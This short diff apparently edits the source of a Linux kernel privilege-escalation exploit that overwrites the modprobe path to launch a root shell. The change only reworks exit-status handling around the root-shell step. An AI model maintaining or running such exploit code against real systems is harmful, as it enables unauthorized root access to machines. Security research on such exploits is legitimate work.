@@ -354,6 +354,7 @@ int trigger_modprobe_sock(void)
 
 int main(void)
 {
+	int result = EXIT_FAILURE;
 	int ret = EXIT_FAILURE;
 	int act_fd = -1;
 	long i = 0;
@@ -503,10 +504,12 @@ int main(void)
 
 		/* Launch the root shell */
 		ret = trigger_modprobe_sock();
-		if (ret == EXIT_FAILURE)
+		if (ret == EXIT_FAILURE) {
 			break;
-		else
+		} else {
+			result = EXIT_SUCCESS;
 			goto end; /* root shell is finished */
+		}
 	}
 
 	printf("[-] failed to find / overwrite / trigger modprobe\n");
@@ -518,5 +521,5 @@ end:
 			perror("[-] close act_fd");
 	}
 
-	return ret;
+	return result;
 }
